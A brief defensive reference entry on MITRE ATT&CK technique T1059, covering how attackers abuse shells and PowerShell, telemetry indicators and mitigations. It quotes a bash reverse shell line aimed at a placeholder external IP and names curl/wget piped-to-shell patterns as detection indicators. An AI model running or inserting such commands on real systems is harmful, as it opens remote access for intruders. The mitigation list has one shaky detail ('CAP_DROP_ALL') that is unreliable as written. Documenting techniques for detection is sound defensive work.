# MITRE ATT&CK Technique T1059: Command and Scripting Interpreter

- **Technique ID:** T1059
- **Tactic:** Execution (TA0002)
- **Sub-techniques:** T1059.001 (PowerShell), T1059.004 (Unix Shell: bash/sh)
- **Platforms:** Linux, Windows, macOS, Containers

## Description
Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces include Unix shells (`sh`, `bash`), Windows Command Shell (`cmd.exe`), and PowerShell. Attackers leverage interpreters to download second-stage payloads, harvest local credentials, establish persistence, and execute living-off-the-land (LotL) binaries.

Following initial compromise via vulnerabilities like Log4Shell or remote access trojans, attackers frequently invoke reverse shells (e.g. `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`) or PowerShell encoded commands (`powershell -encodedCommand ...`).

## Observable Telemetry & Indicators
- Web server process (`nginx`, `httpd`, `java`, `node`) spawning interactive shells (`/bin/sh`, `/bin/bash`, `powershell.exe`).
- Process arguments containing base64 encoded command blocks or invocations of `curl | sh` / `wget | bash`.
- Network sockets established directly from shell processes to external IPs.

## Actionable Mitigations
1. **Container & Process Privilege Restriction:** Run containerized services with read-only root filesystems (`readOnlyRootFilesystem: true`) and drop all Linux capabilities (`CAP_DROP_ALL`).
2. **AppArmor / SELinux Enforcement:** Apply mandatory access control profiles preventing web daemon users from executing shell interpreters.
3. **Auditd & EDR Monitoring:** Enable Linux Audit daemon (`auditd`) rules to log `execve` syscalls for interactive shells and command utilities.
